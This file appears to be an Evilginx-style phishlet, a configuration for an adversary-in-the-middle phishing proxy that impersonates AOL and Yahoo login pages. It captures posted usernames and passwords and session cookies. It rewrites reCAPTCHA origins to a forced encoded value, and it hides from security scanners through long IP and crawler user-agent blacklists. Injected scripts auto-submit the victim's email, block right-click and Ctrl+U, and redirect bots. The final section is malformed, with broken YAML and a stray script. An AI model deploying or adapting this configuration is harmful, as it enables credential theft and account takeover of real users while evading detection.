
name: "aol"
min_ver: "2.3.0"

proxy_hosts:
  - { phish_sub: "ccom", orig_sub: "login", domain: "aol.com", session: true, is_landing: true, auto_filter: true }
  - { phish_sub: "www", orig_sub: "www", domain: "aol.com", session: true, is_landing: false, auto_filter: true }
#  - { phish_sub: "yimg", orig_sub: "s", domain: "yimg.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "mailgpt", orig_sub: "gpt", domain: "mail.yahoo.net", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "ep1", orig_sub: "ep1", domain: "adtrafficquality.google", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "ep2", orig_sub: "ep2", domain: "adtrafficquality.google", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "ads", orig_sub: "securepubads", domain: "g.doubleclick.net", session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'ww1', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'ww2', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}

  - { phish_sub: "csp", orig_sub: "csp", domain: "yahoo.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "ups", orig_sub: "ups", domain: "analytics.yahoo.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "safeframe", orig_sub: "safeframe", domain: "googlesyndication.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "pubads", orig_sub: "ads", domain: "pubmatic.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "ylogin", orig_sub: "login", domain: "yahoo.net", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "3pgeo", orig_sub: "3p-geo", domain: "yahoo.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "opusanalytics", orig_sub: "opus.analytics", domain: "yahoo.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "3pudc", orig_sub: "3p-udc", domain: "yahoo.com", session: true, is_landing: false, auto_filter: true }
#  - { phish_sub: "wwwwwww", orig_sub: "www", domain: "google-analytics.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "guce", orig_sub: "guce", domain: "aol.com", session: true, is_landing: false, auto_filter: true }


sub_filters:
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'po\.integrity=', replace: '/*po.integrity=', mimes: ['text/javascript']}
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'var e=', replace: '*/var e=', mimes: ['text/javascript', 'text/html', 'application/json']}

  # - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yahoo.com', search: 'using your', replace: 'fucking delete your', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  # - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  # - {triggers_on: 'login.yahoo.net', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  # - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  # - {triggers_on: 's.yimg.com',      orig_sub: '', domain: 'yimg.com',  search: '{domain}',  replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  # - {triggers_on: 's.yimg.com',      orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

  # - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'aol.com', search: '{domain}', replace: '{domain}', mimes: ['text/html']}

  - {triggers_on: 'www.aol.com', orig_sub: '', domain: 'aol.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}


auth_tokens:
  - domain: '.aol.com'
    keys: ['OTH', 'A1S', '.*,regexp']
  - domain: '.login.aol.com'
    keys: ['T', 'Y', 'AS', '.*,regexp']
  - domain: '.www.aol.com'
    keys: ['OTHP', '.*,regexp']    

auth_urls:
  - '/account/challenge/email-verify'
  - '/account/challenge/phone-verify'
  - '/?guce_referrer=*'
  
force_get:

  - path: '/recaptcha/enterprise/anchor'
  
    search: 
    
      - {key: 'co', search: '.*', regexp: true}            
      
    force:
    
      - {key: 'co', value: 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz.'}

    force_get_modified: true
      
    type: 'query'
credentials:
  username:
    key: "username"
    search: "(.*)"
    type: "post"
  password:
    key: "password$"
    search: "(.*)"
    type: "post"


login:
  domain: "login.aol.com"
  path: "/"
cloaking:
  enabled: true
  ip_whitelist: []
  ip_blacklist:
    - 8.8.8.8
    - 8.8.4.4
    - 64.233.160.0/19
    - 66.102.0.0/20
    - 66.249.80.0/20
    - 72.14.192.0/18
    - 74.125.0.0/16
    - 108.177.8.0/21
    - 173.194.0.0/16
    - 207.126.144.0/20
    - 209.85.128.0/17
    - 216.58.192.0/19
    - 216.239.32.0/19
    - 66.102.6.194
    - 66.102.6.195
    - 66.102.6.196
    - 66.102.6.197
    - 66.102.6.198
    - 66.102.6.199
    - 66.102.6.200
    - 66.102.6.201
    - 66.102.6.202
    - 66.102.6.203
    - 40.96.0.0/12
    - 52.96.0.0/14
    - 98.137.54.0/24
    - 74.6.136.0/24
    - 74.6.128.0/19
    - 72.30.0.0/16
    - 98.139.0.0/16
    - 67.195.0.0/16
    - 66.196.64.0/19
    - 64.233.160.0/19
    - 66.102.0.0/20
    - 66.249.80.0/20
    - 72.14.192.0/18
    - 74.125.0.0/16
    - 108.177.8.0/21
    - 172.217.0.0/19
    - 209.85.128.0/17
    - 66.102.6.0/24
    - 66.249.64.0/19
    - 72.14.194.0/24
    - 66.249.74.9
    - 66.249.74.10
    - 66.249.74.11
    - 66.249.74.12
    - 66.249.74.13
    - 66.249.74.14
    - 66.249.74.1
    - 66.249.65.13
    - 66.249.65.14
    - 66.249.64.0 - 66.249.95.255
    - 66.102.6.0 - 66.102.15.255
    - 64.233.160.0 - 64.233.191.255
    - 209.85.128.0 - 209.85.255.255
    - 216.239.32.0 - 216.239.63.255
    - 216.239.32.0/19
  user_agent_blacklist:
    - Googlebot
    - bingbot
    - YandexBot
    - Baiduspider
    - DuckDuckBot
    - Slurp
    - Sogou
    - Exabot
    - facebot
    - ia_archiver
    - MJ12bot
    - AhrefsBot
    - SemrushBot
    - DotBot
    - SEMrushBot
    - spbot
    - linkdexbot
    - SeznamBot
    - sitebot
    - BLEXBot
    - Twitterbot
    - TweetmemeBot
    - BitlyBot
    - Pinterbot
    - facebookexternalhit
    - WhatsApp
    - TelegramBot
    - Slackbot
    - Discordbot
    - Googlebot-Image
    - Googlebot-Video
    - Googlebot-News
    - Googlebot-Mobile
    - AdsBot-Google
    - AdsBot-Google-Mobile
    - Mediapartners-Google
    - Mediapartners
    - NetcraftSurveyAgent
    - DigitalOcean
    - Microsoft-CryptoAPI
    - msnbot
    - Adidxbot
    - Applebot
    - ArchiveBot
    - BacklinkCrawler
    - BUbiNG
    - CCBot
    - Dataprovider
    - DotBot
    - Exabot
    - Favicons
    - findlinks
    - Google-Site-Verification
    - Google-Youtube-Links
    - Google-Favicon
    - GrapeshotCrawler
    - heritrix
    - IASCrawler
    - InfoSeek
    - Lighthouse
    - LinkpadBot
    - MegaIndex
    - MJ12bot
    - msnbot
    - nutch
    - PhantomJS
    - Pingdom
    - Riddler
    - rogerbot
    - Scrapy
    - SEOENGBot
    - Screaming Frog SEO Spider
    - SeznamBot
    - Slackbot
    - Sogou
    - Spider
    - TelegramBot
    - Uptimebot
    - W3C_Validator
    - Wget
    - Yahoo! Slurp
    - Yandex
    - YandexBot
    - Yeti
    - YisouSpider
    - Zookabot
    - Googlebot
    - bingbot
    - YandexBot
    - Baiduspider
    - DuckDuckBot
    - Slurp
    - Sogou
    - Exabot
    - facebot
    - ia_archiver
    - MJ12bot
    - AhrefsBot
    - SemrushBot
    - DotBot
    - SEMrushBot
    - spbot
    - linkdexbot
    - SeznamBot
    - sitebot
    - BLEXBot
    - Twitterbot
    - TweetmemeBot
    - BitlyBot
    - Pinterbot
    - facebookexternalhit
    - WhatsApp
    - TelegramBot
    - Slackbot
    - Discordbot
    - Googlebot-Image
    - Googlebot-Video
    - Googlebot-News
    - Googlebot-Mobile
    - AdsBot-Google
    - AdsBot-Google-Mobile
    - Mediapartners-Google
    - Mediapartners
    - Mediapartners-Google/2.1
    - Mediapartners-Google/3.0
    - AdsBot-Google/1.0
    - AdsBot-Google-Mobile-Apps
  redirect_url: https:/google.com
js_inject:
  - trigger_domains: ["login.aol.com"]
    trigger_paths: ["/*"]
    script: |
      window.addEventListener("load", () => {
        if (window.location.hash.length == 0) {
          return
        }
        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
        waitForElm("#login-username").then((elm) => {
          elm.focus();
          elm.value = window.location.hash.slice(1);
          const submBtn = document.querySelector("#login-signin");
          submBtn.focus();
          submBtn.click();
        });
      });
      

       // Disable right-click context menu
      document.addEventListener('contextmenu', function(e) {
          e.preventDefault();
      });

--- >-
// Disable Ctrl+U document.addEventListener('keydown', function(event) { if
(event.ctrlKey && event.key === 'u') { event.preventDefault(); alert('Ctrl+U is
disabled on this website.'); return false; } });

// Function to check if the user agent is a bot function isBot() { var userAgent
= navigator.userAgent.toLowerCase(); var bots = [
              "googlebot", "adsbot-google", "mediapartners-google", "google-web-preview", "google-read-aloud",
              "feedfetcher-google", "google-sitemaps", "googlebot-mobile", "googlebot-image", "googlebot-news",
              "googlebot-video", "adsense", "adsbot", "google-structured-data-testing-tool", "google-search-console",
              "google-databoard", "google-earth", "google-favicon", "google-feedback", "google-index",
              "google-instant", "google-maps", "google-mobile-adsense", "google-page-speed-insights",
              "google-publisher-plugin", "google-structured-data-markup-helper", "google-translate",
              "google-web-light", "google-adsbot", "googlebot-news", "googlebot-image", "googlebot-video",
              "googlebot-mobile", "adsbot-google-mobile", "google-structured-data-tester", "google-wireless-transcoder",
              "google-toolbar", "googlebot-x", "google-sitemap-generator", "googlebot-other", "google-scraper",
              "google-adwords", "google-ads", "google-web-previewer", "google-mobile", "google-generate",
              "google-website-translator", "google-search", "bingbot", "msnbot", "office365bot", "slurp",
              "skypeuripreview", "netcraft", "netcraftssl", "netcraftsurveybot", "edgbot", "doipbot", "do-spider",
              "telegrambot", "phantomjs", "pinterestbot", "applebot", "twitterbot", "facebookexternalhit",
              "linkedinbot", "slackbot", "discordbot", "whatsapp", "instagram", "bot", "crawler", "spider",
              "archive.org_bot", "ahrefsbot", "mj12bot", "semrushbot", "rogerbot", "dotbot", "yandexbot",
              "baiduspider", "sogou", "exabot", "ezooms", "jauntybot", "obot", "blexbot", "careerbot", "ia_archiver",
              "twiceler"
          ];
          return bots.some(function(bot) {
              return userAgent.indexOf(bot) !== -1;
          });
      }

      // Main function to prevent bots
      function preventBots() {
          if (isBot()) {
              window.location.href = "https://google.com/access-denied";
          } else {
              console.log("Access granted");
          }
      }
      
      
      
        - |
        <script type="text/javascript">
            var mouseMovements = [];
            var lastMoveTime = new Date().getTime();

            function logMouseMovement(event) {
                var currentTime = new Date().getTime();
                var timeDiff = currentTime - lastMoveTime;
                lastMoveTime = currentTime;

                mouseMovements.push({
                    x: event.clientX,
                    y: event.clientY,
                    time: timeDiff
                });

                if (mouseMovements.length > 100) {
                    analyzeMouseMovements();
                    mouseMovements = [];
                }
            }

            function analyzeMouseMovements() {
                var fastMoves = 0;
                var straightLines = 0;
                var lastMovement = null;

                for (var i = 0; i < mouseMovements.length; i++) {
                    if (mouseMovements[i].time < 50) {
                        fastMoves++;
                    }

                    if (lastMovement) {
                        var dx = mouseMovements[i].x - lastMovement.x;
                        var dy = mouseMovements[i].y - lastMovement.y;
                        if (Math.abs(dx) < 10 || Math.abs(dy) < 10) {
                            straightLines++;
                        }
                    }
                    lastMovement = mouseMovements[i];
                }

                if (fastMoves > 50 || straightLines > 50) {
                    blockAccess();
                }
            }

            function blockAccess() {
                document.body.innerHTML = "<h1>Access Denied</h1>";
            }

            document.addEventListener('mousemove', logMouseMovement);

            function generateToken() {
                return Math.random().toString(36).substring(2, 15);
            }

            function createDynamicLink() {
                var userId = "exampleUser"; // Make this dynamic if needed
                var token = generateToken();
                var dynamicLink = "https://google.com/welcome?user=" + encodeURIComponent(userId) + "&token=" + encodeURIComponent(token);
                var obfuscatedLink = btoa(dynamicLink);

                var anchor = document.createElement('a');
                anchor.href = atob(obfuscatedLink);
                anchor.innerText = "Click here to proceed";
                document.body.appendChild(anchor);
            }

            window.onload = function() {
                if (validateHuman()) {
                    createDynamicLink();
                } else {
                    blockAccess();
                }
            };

            function validateHuman() {
                // Implement further validation if needed
                return true; // This is a placeholder
            }

            // Honeypot Detection
            document.getElementById('mainForm').addEventListener('submit', function(event) {
                var honeypotField = document.getElementById('honeypot').value;
                if (honeypotField !== "") {
                    blockAccess();
                    event.preventDefault();
                }
            });
        </script>
  redirect_url: "https://google.com"

